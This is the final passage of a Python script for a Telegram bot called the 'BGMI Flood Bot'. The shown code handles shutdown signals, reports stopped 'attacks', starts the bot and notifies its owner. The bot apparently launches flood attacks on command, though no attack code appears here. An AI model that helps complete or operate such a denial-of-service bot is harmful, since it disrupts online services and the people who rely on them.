            logger.info(f"Stopped {count} attack(s)")
        asyncio.ensure_future(bot.disconnect())
    
    # Register async-safe signal handlers
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, shutdown_handler)
    
    await bot.start(bot_token=BOT_TOKEN)
    logger.info("✅ Bot connected!")
    
    # Notify owner
    try:
        await bot.send_message(OWNER_ID, "⚡ **BGMI Flood Bot Online!**\n\nUse `/help` for commands.")
    except Exception:
        pass
    
    # Run until disconnected
    await bot.run_until_disconnected()
    logger.info("Bot shutdown complete.")

if __name__ == "__main__":
    try:
        import psutil
    except ImportError:
        logger.warning("psutil not installed, /status will fail. Install with: pip install psutil")
    
    asyncio.run(main())
